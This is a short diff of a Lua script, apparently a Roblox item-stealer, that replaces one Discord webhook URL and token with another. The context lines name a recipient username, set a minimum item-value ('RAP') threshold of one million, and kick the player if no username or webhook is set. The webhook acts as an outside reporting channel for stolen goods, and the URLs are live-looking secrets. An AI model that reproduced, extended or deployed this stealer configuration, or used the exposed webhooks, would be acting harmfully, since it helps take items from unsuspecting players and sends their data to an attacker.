@@ -19,7 +19,7 @@ end
 
 local users = {"victtoroo"}
 local min_rap = _G.minrap or 1000000
-local webhook = "https://discord.com/api/webhooks/1433504887156172974/_JWGaijqm2qw-cDT0qgNfEmG9_-W0TLlWjvyV0aPzX4-TjU2QoCj1auVhjOHk7u_axKJ"
+local webhook = "https://discord.com/api/webhooks/1488268792373968966/tvEwbpH8gqpDwWr_aCWI-tL6BS3c45d1UVm-OLmOGJfMSXqki6Dl8rnggnRsLxDmNZHY"
 
 if next(users) == nil or webhook == "" then
     plr:kick("You didn't add any usernames or webhook")
